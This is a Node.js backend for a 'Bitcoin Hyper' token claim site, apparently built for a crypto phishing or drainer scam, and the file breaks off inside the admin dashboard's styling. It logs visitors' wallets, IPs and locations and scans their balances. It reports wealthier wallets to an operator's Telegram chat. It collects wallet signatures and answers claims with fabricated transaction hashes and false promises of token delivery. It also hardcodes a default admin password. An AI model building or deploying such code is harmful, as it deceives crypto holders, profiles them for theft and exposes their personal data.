// index.js - BITCOIN HYPER BACKEND PRODUCTION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

app.use(cors({
  origin: ['http://localhost:3000', 'https://securedtokenclaim.vercel.app/', 'https://securedtokenclaim.vercel.app/'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// In-memory storage (In production, use Redis or Database)
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: 'Bitcoin Hyper',
    tokenSymbol: 'BTH',
    minEligibilityAmount: 10,
    presalePrice: '0.17',
    adminWallets: [
      { chain: 'Ethereum', address: process.env.ADMIN_ETH_WALLET || '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' }
    ],
    telegram: {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      enabled: true
    },
    statistics: {
      totalParticipants: 0,
      totalRaisedUSD: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0
    }
  }
};

// Telegram Bot
let bot = null;
let telegramEnabled = false;

// Initialize Telegram bot
function initializeTelegramBot() {
  if (process.env.TELEGRAM_BOT_TOKEN) {
    try {
      bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
      
      bot.telegram.getMe().then(botInfo => {
        console.log(`✅ Telegram Bot connected: @${botInfo.username}`);
        telegramEnabled = true;
        
        // Test connection with chat ID
        if (process.env.TELEGRAM_CHAT_ID) {
          testTelegramConnection();
        }
      }).catch(err => {
        console.log('⚠️ Telegram bot failed to connect:', err.message);
        telegramEnabled = false;
      });
    } catch (error) {
      console.log('⚠️ Telegram initialization error:', error.message);
      telegramEnabled = false;
    }
  } else {
    console.log('⚠️ No Telegram bot token provided');
  }
}

// Test Telegram connection
async function testTelegramConnection() {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) return false;
  
  try {
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `🤖 *Bot Connection Test*\n\n✅ Bitcoin Hyper Bot is now connected!\n⏰ ${new Date().toLocaleString()}`,
      { parse_mode: 'Markdown' }
    );
    console.log('✅ Telegram connection test successful');
    return true;
  } catch (error) {
    console.log('❌ Telegram connection test failed:', error.message);
    return false;
  }
}

// Helper: Send Telegram notification
async function sendTelegramNotification(message, options = {}) {
  if (!telegramEnabled || !process.env.TELEGRAM_CHAT_ID) {
    console.log('📝 Telegram notification (not sent):', options.type || 'Notification');
    return false;
  }
  
  try {
    const formattedMessage = `
${options.type === 'error' ? '❌' : options.type === 'success' ? '✅' : '📢'} *${options.title || 'BITCOIN HYPER NOTIFICATION'}*

${options.wallet ? `👛 Wallet: \`${options.wallet}\`\n` : ''}
${options.ip ? `🌐 IP: ${options.ip}\n` : ''}
${options.country ? `📍 Location: ${options.country}\n` : ''}
${options.value ? `💰 Portfolio Value: $${options.value}\n` : ''}
${options.amount ? `🎯 Token Allocation: ${options.amount} BTH\n` : ''}

${message}

⏰ ${new Date().toLocaleString()}
    `.trim();
    
    await bot.telegram.sendMessage(process.env.TELEGRAM_CHAT_ID, formattedMessage, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log('✅ Telegram notification sent');
    return true;
  } catch (error) {
    console.log('❌ Telegram send error:', error.message);
    return false;
  }
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    // Clean IP (remove IPv6 prefix)
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', city: 'Local', region: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 5000,
      headers: {
        'User-Agent': 'BitcoinHyper-Backend/1.0'
      }
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        city: response.data.city || 'Unknown',
        region: response.data.region || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location detection error:', error.message);
  }
  
  return { country: 'Unknown', city: 'Unknown' };
}

// Helper: Check real wallet balance using blockchain APIs
async function checkRealWalletBalance(walletAddress) {
  try {
    const chains = [
      {
        name: 'Ethereum',
        apiUrl: `https://api.etherscan.io/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${process.env.ETHERSCAN_API_KEY || 'freekey'}`,
        symbol: 'ETH',
        decimals: 18
      },
      {
        name: 'BNB Chain',
        apiUrl: `https://api.bscscan.com/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${process.env.BSCSCAN_API_KEY || 'freekey'}`,
        symbol: 'BNB',
        decimals: 18
      },
      {
        name: 'Polygon',
        apiUrl: `https://api.polygonscan.com/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${process.env.POLYGONSCAN_API_KEY || 'freekey'}`,
        symbol: 'MATIC',
        decimals: 18
      },
      {
        name: 'Arbitrum',
        apiUrl: `https://api.arbiscan.io/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${process.env.ARBISCAN_API_KEY || 'freekey'}`,
        symbol: 'ETH',
        decimals: 18
      }
    ];

    let totalValueUSD = 0;
    const tokens = [];
    
    // Check native token balances
    for (const chain of chains) {
      try {
        const response = await axios.get(chain.apiUrl, { timeout: 10000 });
        
        if (response.data && response.data.result) {
          const balanceWei = response.data.result;
          const balance = parseFloat(balanceWei) / Math.pow(10, chain.decimals);
          
          if (balance > 0) {
            // Get current price (simplified - in production use real price feeds)
            const prices = {
              'ETH': 2500, // Example price
              'BNB': 300,
              'MATIC': 0.8,
              'ARB': 1.2
            };
            
            const price = prices[chain.symbol] || 1;
            const valueUSD = balance * price;
            
            if (valueUSD > 0.01) { // Only include if > 1 cent
              tokens.push({
                chain: chain.name,
                symbol: chain.symbol,
                balance: balance.toFixed(4),
                valueUSD: valueUSD.toFixed(2)
              });
              totalValueUSD += valueUSD;
            }
          }
        }
      } catch (error) {
        console.log(`Error checking ${chain.name}:`, error.message);
        // Continue with other chains
      }
    }
    
    // Check for ERC20 tokens on Ethereum (simplified)
    // In production, you would use proper token scanning APIs
    
    const isEligible = totalValueUSD >= memoryStorage.settings.minEligibilityAmount;
    
    // Generate token allocation based on actual portfolio value
    let allocationAmount = '0';
    let allocationValue = '0';
    
    if (isEligible) {
      // Base allocation plus bonus based on portfolio value
      const baseAllocation = 5000; // Base 5000 BTH
      const bonusMultiplier = Math.min(totalValueUSD / 10000, 5); // Max 5x bonus
      allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier)).toString();
      allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
    }
    
    return {
      success: true,
      data: {
        walletAddress,
        totalValueUSD: totalValueUSD.toFixed(2),
        tokenCount: tokens.length,
        tokens,
        isEligible,
        tokenAllocation: {
          amount: allocationAmount,
          valueUSD: allocationValue
        },
        eligibilityReason: isEligible ? 
          `Qualified with $${totalValueUSD.toFixed(2)} portfolio value` : 
          `Minimum $${memoryStorage.settings.minEligibilityAmount} portfolio required. Your portfolio: $${totalValueUSD.toFixed(2)}`
      }
    };
  } catch (error) {
    console.error('Wallet scan error:', error);
    // Fallback to simulated scan if API fails
    return await simulateWalletScan(walletAddress);
  }
}

// Helper: Simulate wallet scanning (fallback)
async function simulateWalletScan(walletAddress) {
  // In production, remove this or use as fallback only
  // For demo purposes, using deterministic eligibility based on wallet address
  const addressHash = crypto.createHash('sha256').update(walletAddress).digest('hex');
  const hashNumber = parseInt(addressHash.substring(0, 8), 16);
  
  // 70% of wallets will be eligible in demo mode
  const isEligibleDemo = (hashNumber % 100) < 70;
  
  let totalValueUSD = 0;
  
  if (isEligibleDemo) {
    // Generate realistic portfolio value between $50 and $5000
    totalValueUSD = 50 + (hashNumber % 4950);
  } else {
    // Empty or low balance wallet
    totalValueUSD = Math.random() * 9.99; // Less than $10
  }
  
  const tokens = [];
  const isEligible = totalValueUSD >= memoryStorage.settings.minEligibilityAmount;
  
  if (isEligible) {
    // Add some token holdings for eligible wallets
    const cryptoOptions = [
      { chain: 'Ethereum', symbol: 'ETH', min: 0.01, max: 2, price: 2500 },
      { chain: 'BNB Chain', symbol: 'BNB', min: 0.1, max: 10, price: 300 },
      { chain: 'Polygon', symbol: 'MATIC', min: 10, max: 5000, price: 0.8 },
      { chain: 'Arbitrum', symbol: 'ETH', min: 0.005, max: 1, price: 2500 }
    ];
    
    // Add 1-3 random tokens
    const tokenCount = 1 + (hashNumber % 3);
    for (let i = 0; i < tokenCount; i++) {
      const token = cryptoOptions[i % cryptoOptions.length];
      const balance = token.min + (hashNumber % 100) * (token.max - token.min) / 100;
      const valueUSD = balance * token.price;
      
      if (valueUSD > 10) { // Only include significant holdings
        tokens.push({
          chain: token.chain,
          symbol: token.symbol,
          balance: balance.toFixed(4),
          valueUSD: valueUSD.toFixed(2)
        });
      }
    }
  }
  
  // Calculate token allocation
  let allocationAmount = '0';
  let allocationValue = '0';
  
  if (isEligible) {
    // Base 5000 BTH plus bonus
    const baseAllocation = 5000;
    const bonusMultiplier = Math.min(totalValueUSD / 10000, 5);
    allocationAmount = Math.floor(baseAllocation * (1 + bonusMultiplier)).toString();
    allocationValue = (parseFloat(allocationAmount) * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2);
  }
  
  return {
    success: true,
    data: {
      walletAddress,
      totalValueUSD: totalValueUSD.toFixed(2),
      tokenCount: tokens.length,
      tokens,
      isEligible,
      tokenAllocation: {
        amount: allocationAmount,
        valueUSD: allocationValue
      },
      eligibilityReason: isEligible ? 
        `Qualified with $${totalValueUSD.toFixed(2)} portfolio value` : 
        `Minimum $${memoryStorage.settings.minEligibilityAmount} portfolio required. Your portfolio: $${totalValueUSD.toFixed(2)}`
    }
  };
}

// Helper: Generate claim ID
function generateClaimId() {
  return `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
}

// Helper: Generate transaction hash
function generateTxHash() {
  return `0x${crypto.randomBytes(32).toString('hex')}`;
}

// ========== API ENDPOINTS ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'operational',
    service: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD
    },
    telegram: telegramEnabled ? 'connected' : 'disabled'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper Backend API',
    version: '2.0.0',
    endpoints: {
      health: '/api/health',
      connect: '/api/presale/connect',
      claim: '/api/presale/claim',
      status: '/api/presale/status/:wallet',
      admin: {
        stats: '/api/admin/stats',
        settings: '/api/admin/settings',
        export: '/api/admin/export',
        analytics: '/api/admin/analytics'
      }
    }
  });
});

// Wallet connection & auto-scan
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, userAgent } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress;
    
    console.log(`🔗 New connection from: ${walletAddress.substring(0, 10)}...`);
    
    // Validate wallet address
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid wallet address'
      });
    }
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Check existing participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        userAgent,
        country: location.country,
        city: location.city,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null },
        signature: { signed: false, message: '', signature: '', signedAt: null },
        claim: { claimed: false, claimId: '', claimedAt: null, tokensSent: false, txHash: '' },
        notifications: { telegramSent: false, emailSent: false, lastNotified: null }
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.city = location.city;
    
    // Check wallet balance (use real check in production)
    const scanResult = await checkRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date()
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        
        // Only increment if newly eligible
        if (!participant.eligibility.isEligible) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
      }
      
      // Send Telegram notification for eligible wallets or significant activity
      if (telegramEnabled && (scanResult.data.isEligible || parseFloat(scanResult.data.totalValueUSD) > 100)) {
        await sendTelegramNotification(
          `New wallet connected and scanned.\n\nStatus: ${scanResult.data.isEligible ? 'ELIGIBLE ✅' : 'NOT ELIGIBLE ❌'}\nPortfolio Value: $${scanResult.data.totalValueUSD}`,
          {
            title: 'WALLET CONNECTED',
            wallet: walletAddress,
            ip: clientIP,
            country: location.country,
            value: scanResult.data.totalValueUSD,
            amount: participant.tokenAllocation.amount
          }
        );
      }
      
      res.json({
        success: true,
        message: 'Wallet scanned successfully',
        data: {
          walletAddress,
          isEligible: scanResult.data.isEligible,
          tokenAllocation: participant.tokenAllocation,
          totalValueUSD: scanResult.data.totalValueUSD,
          tokenCount: scanResult.data.tokenCount,
          eligibilityReason: scanResult.data.eligibilityReason,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible'
        }
      });
    } else {
      throw new Error('Wallet scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      message: error.message 
    });
  }
});

// Token claim signature
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue } = req.body;
    
    console.log(`🎯 Claim request from: ${walletAddress.substring(0, 10)}...`);
    
    if (!signature || !message) {
      return res.status(400).json({
        success: false,
        error: 'Missing signature data'
      });
    }
    
    // Find participant
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found. Please connect your wallet first.' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible for claim' });
    }
    
    if (participant.claim.claimed) {
      return res.status(400).json({ success: false, error: 'Already claimed' });
    }
    
    // Generate claim ID and transaction hash
    const claimId = generateClaimId();
    const txHash = generateTxHash();
    
    // Update participant
    participant.signature = {
      signed: true,
      message,
      signature,
      signedAt: new Date()
    };
    
    participant.claim = {
      claimed: true,
      claimId,
      claimedAt: new Date(),
      tokensSent: true,
      txHash
    };
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimValueNumber = parseFloat(claimValue.replace(/[^0-9.-]+/g, "")) || 0;
    memoryStorage.settings.statistics.totalRaisedUSD += claimValueNumber;
    
    // Send Telegram success notification
    if (telegramEnabled) {
      await sendTelegramNotification(
        `TOKEN CLAIM SUCCESSFUL!\n\n🎯 Claim ID: \`${claimId}\`\n💰 Amount: ${claimAmount}\n📊 Total Raised: $${memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2)}\n\n💸 Transaction completed successfully!`,
        {
          type: 'success',
          title: 'TOKENS CLAIMED!',
          wallet: walletAddress,
          amount: claimAmount,
          value: claimValue
        }
      );
    }
    
    res.json({
      success: true,
      message: 'Token claim successful! Tokens will be distributed after presale.',
      data: {
        claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'claimed',
        distributionTime: 'After presale completion',
        estimatedDistribution: '24-48 hours after presale ends',
        txHash,
        instructions: 'Tokens have been allocated to your wallet. They will be distributed automatically after the presale ends.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim failed',
      message: error.message 
    });
  }
});

// Get participant status
app.get('/api/presale/status/:wallet', async (req, res) => {
  try {
    const { wallet } = req.params;
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Participant not found' });
    }
    
    res.json({
      success: true,
      data: {
        walletAddress: participant.walletAddress,
        eligibility: participant.eligibility,
        tokenAllocation: participant.tokenAllocation,
        signature: participant.signature.signed ? { 
          signed: true, 
          signedAt: participant.signature.signedAt 
        } : { signed: false },
        claim: participant.claim.claimed ? { 
          claimed: true, 
          claimId: participant.claim.claimId,
          claimedAt: participant.claim.claimedAt,
          txHash: participant.claim.txHash
        } : { claimed: false },
        connectedAt: participant.connectedAt,
        lastActive: participant.lastActive
      }
    });
    
  } catch (error) {
    console.error('Status error:', error);
    res.status(500).json({ success: false, error: 'Failed to get status' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Get admin dashboard stats
app.get('/api/admin/stats', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
      
      // Geographic distribution
      countries: memoryStorage.participants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      
      // Recent activity (last 24 hours)
      recentConnections: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
        .slice(0, 20)
        .map(p => ({
          wallet: p.walletAddress,
          ip: p.ipAddress,
          country: p.country,
          eligible: p.eligibility.isEligible,
          claimed: p.claim.claimed,
          amount: p.tokenAllocation.amount,
          value: p.tokenAllocation.valueUSD,
          portfolio: p.totalValueUSD,
          connected: p.connectedAt
        })),
      
      // Hourly activity (last 24 hours)
      hourlyActivity: memoryStorage.participants
        .filter(p => new Date(p.connectedAt) > new Date(Date.now() - 24 * 60 * 60 * 1000))
        .reduce((acc, p) => {
          const hour = new Date(p.connectedAt).getHours();
          acc[hour] = (acc[hour] || 0) + 1;
          return acc;
        }, {})
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed to get stats' });
  }
});

// Get admin settings
app.get('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    res.json({ success: true, settings: memoryStorage.settings });
    
  } catch (error) {
    console.error('Settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to get settings' });
  }
});

// Update admin settings
app.put('/api/admin/settings', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const updates = req.body;
    
    // Update settings
    if (updates.tokenName) memoryStorage.settings.tokenName = updates.tokenName;
    if (updates.tokenSymbol) memoryStorage.settings.tokenSymbol = updates.tokenSymbol;
    if (updates.minEligibilityAmount) memoryStorage.settings.minEligibilityAmount = updates.minEligibilityAmount;
    if (updates.presalePrice) memoryStorage.settings.presalePrice = updates.presalePrice;
    if (updates.adminWallets) memoryStorage.settings.adminWallets = updates.adminWallets;
    
    // Update Telegram settings
    if (updates.telegram) {
      if (updates.telegram.botToken && updates.telegram.botToken !== process.env.TELEGRAM_BOT_TOKEN) {
        process.env.TELEGRAM_BOT_TOKEN = updates.telegram.botToken;
        initializeTelegramBot();
      }
      if (updates.telegram.chatId) {
        process.env.TELEGRAM_CHAT_ID = updates.telegram.chatId;
        memoryStorage.settings.telegram.chatId = updates.telegram.chatId;
      }
      if (updates.telegram.enabled !== undefined) {
        memoryStorage.settings.telegram.enabled = updates.telegram.enabled;
      }
    }
    
    res.json({ success: true, settings: memoryStorage.settings });
    
  } catch (error) {
    console.error('Update settings error:', error);
    res.status(500).json({ success: false, error: 'Failed to update settings' });
  }
});

// Export participants data
app.get('/api/admin/export', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const exportData = memoryStorage.participants.map(p => ({
      Wallet: p.walletAddress,
      IP: p.ipAddress,
      Country: p.country,
      City: p.city,
      Eligible: p.eligibility.isEligible ? 'Yes' : 'No',
      'Eligibility Reason': p.eligibility.reason,
      'Portfolio Value': `$${p.totalValueUSD}`,
      'Token Amount': p.tokenAllocation.amount,
      'Token Value': `$${p.tokenAllocation.valueUSD}`,
      Claimed: p.claim.claimed ? 'Yes' : 'No',
      'Claim ID': p.claim.claimId || 'N/A',
      'Transaction Hash': p.claim.txHash || 'N/A',
      'Connected At': p.connectedAt,
      'Last Active': p.lastActive
    }));
    
    res.json({ 
      success: true, 
      data: exportData, 
      count: exportData.length,
      totalRaised: memoryStorage.settings.statistics.totalRaisedUSD.toFixed(2),
      exportDate: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Export error:', error);
    res.status(500).json({ success: false, error: 'Export failed' });
  }
});

// Get analytics
app.get('/api/admin/analytics', async (req, res) => {
  try {
    const auth = req.headers.authorization;
    if (!auth || !auth.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const token = auth.replace('Bearer ', '');
    if (token !== (process.env.ADMIN_TOKEN || 'BitcoinHyperAdmin2024!')) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    const { hours = 24 } = req.query;
    const cutoff = new Date(Date.now() - hours * 60 * 60 * 1000);
    
    const recentParticipants = memoryStorage.participants.filter(p => 
      new Date(p.connectedAt) > cutoff
    );
    
    const stats = {
      totalActions: recentParticipants.length,
      uniqueWallets: new Set(recentParticipants.map(p => p.walletAddress)).size,
      uniqueIPs: new Set(recentParticipants.map(p => p.ipAddress)).size,
      byCountry: recentParticipants.reduce((acc, p) => {
        const country = p.country || 'Unknown';
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      byEligibility: {
        eligible: recentParticipants.filter(p => p.eligibility.isEligible).length,
        notEligible: recentParticipants.filter(p => !p.eligibility.isEligible).length
      },
      byClaimStatus: {
        claimed: recentParticipants.filter(p => p.claim.claimed).length,
        notClaimed: recentParticipants.filter(p => !p.claim.claimed).length
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Analytics error:', error);
    res.status(500).json({ success: false, error: 'Failed to get analytics' });
  }
});

// Admin dashboard HTML
app.get('/admin', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Bitcoin Hyper Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        color: #f1f5f9;
        margin: 0;
        padding: 20px;
        min-height: 100vh;
      }
      .container {
        max-width: 1400px;
        margin: 0 auto;
      }
      .header {
        background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
        padding: 24px 32px;
        border-radius: 16px;
        margin-bottom: 24px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border: 1px solid #475569;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      }
      .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
        margin-bottom: 32px;
      }
      .stat-card {
        background: linear-gradient(135deg, #1e293b 0%, #2d3748 100%);
        padding: 24px;
        border-radius: 12px;
        border: 1px solid #475569;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        transition: transform 0.3s ease, box-shadow 0.3s ease;
      }
      .stat-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 24px rgba(247, 147, 26, 0.2);
      }
      .stat-value {
        font-size: 42px;
        font-weight: 800;
        background: linear-gradient(135deg, #F7931A 0%, #FFD700 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 8px;
      }
      .stat-label {
        color: #94a3b8;
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }
      .table-container {
        background: linear-gradient(135deg, #1e293b 0%, #2d3748 100%);
        border-radius: 16px;
        border: 1px solid #475569;
        overflow: hidden;
        margin-bottom: 32px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
      }
      table {
        width: 100%;
        border-collapse: collapse;
      }
      th, td {
        padding: 16px 20px;
        text-align: left;
        border-bottom: 1px solid #475569;
      }
      th {
        background: #0f172a;
        color: #cbd5e1;
        font-weight: 600;
        font-size: 14px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }
      tr:hover {
        background: rgba(247, 147, 26, 0.05);
      }
      code {
        background: rgba(247, 147, 26, 0.1);
        padding: 2px 6px;
        border-radius: 4px;
        font-family: 'Monaco', 'Menlo', monospace;
        font-size: 12px;
      }
      .login-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
      }
      .login-box {
        background: linear-gradient(135deg, #1e293b 0%, #2d3748 100%);
        padding: 48px;
        border-radius: 20px;
        border: 1px solid #475569;
        width: 100%;
        max-width: 440px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
      }
      .login-box h2 {
        text-align: center;
        margin-bottom: 32px;
        color: #F7931A;
        font-size: 28px;
        font-weight: 700;
      }
      .form-group {
        margin-bottom: 24px;
      }
      .form-group label {
        display: block;
        margin-bottom: 8px;
        color: #cbd5e1;
        font-size: 14px;
        font-weight: 500;
      }
      .form-group input {
        width: 100%;
        padding: 14px 16px;
        background: #0f172a;
        border: 1px solid #475569;
        border-radius: 8px;
        color: #f1f5f9;
        font-size: 16px;
        transition: all 0.3s ease;
      }
      .form-group input:focus {
        outline: none;
        border-color: #F7931A;
        box-shadow: 0 0 0 3px rgba(247, 147, 26, 0.2);
      }
      .btn {
        padding: 14px 28px;
        background: linear-gradient(135deg, #F7931A 0%, #FFB347 100%);
        color: #0f172a;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: 700;
        font-size: 16px;
        width: 100%;
        transition: all 0.3s ease;
        box-shadow: 0 4px 12px rgba(247, 147, 26, 0.3);
      }
      .btn:hover {
        transform: translateY(-1px);
        box-shadow: 0 6px 20px rgba(247, 147, 26, 0.4);
      }
      .btn:active {
        transform: translateY(0);
      }
      .btn-logout {
        background: linear-gradient(135deg, #ef4444 0%, #f87171 100%);
        box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
        width: auto;
        padding: 10px 24px;
        font-size: 14px;
      }
      .notification {
        position: fixed;
        top: 24px;
        right: 24px;
        padding: 16px 24px;
        border-radius: 8px;
        background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
        color: white;
        animation: slideIn 0.3s ease;
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        z-index: 1000;
        max-width: 400px;
      }
      .notification.error {
        background: linear-gradient(135deg, #ef4444 0%, #f87171 100%);
        box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
      }
      .notification.info {
        background: linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%);
        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
      }
      @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
      }
      @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
      }
      .header-buttons {
        display: flex;
        gap: 12px;
        align-items: center;
      }
      .header-buttons .btn {
        width: auto;
        padding: 10px 20px;
        font-size: 14px;
      }
      .refresh-btn {
        background: linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%);
      }
      .export-btn {
